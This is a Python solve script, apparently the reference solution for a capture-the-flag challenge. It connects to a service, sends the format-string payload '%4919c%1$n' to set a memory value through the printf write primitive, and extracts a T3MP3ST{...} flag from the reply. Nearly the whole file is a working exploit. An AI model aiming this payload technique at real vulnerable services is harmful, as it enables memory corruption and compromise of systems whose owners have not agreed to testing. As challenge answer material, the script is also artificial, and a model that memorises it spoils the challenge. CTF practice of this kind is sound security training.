#!/usr/bin/env python3
"""Deterministically exercise the challenge's format-string write primitive."""

import argparse
import re
import socket


def solve(host: str, port: int) -> str:
    with socket.create_connection((host, port), timeout=5) as connection:
        # The server writes the welcome banner before its single input read:
        # consume it, then send the payload as the first and only write. The
        # server captures client input with one read(255) and tears down the
        # connection, so any earlier bytes would be consumed first and the
        # real payload would land on a closed socket.
        connection.recv(4096)
        connection.sendall(b"%4919c%1$n\n")
        response = b""
        while True:
            chunk = connection.recv(8192)
            if not chunk:
                break
            response += chunk
    match = re.search(rb"T3MP3ST\{[A-Za-z0-9_]+\}", response)
    if not match:
        raise RuntimeError("exploit did not return a flag")
    return match.group(0).decode()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=9002)
    args = parser.parse_args()
    print(solve(args.host, args.port))
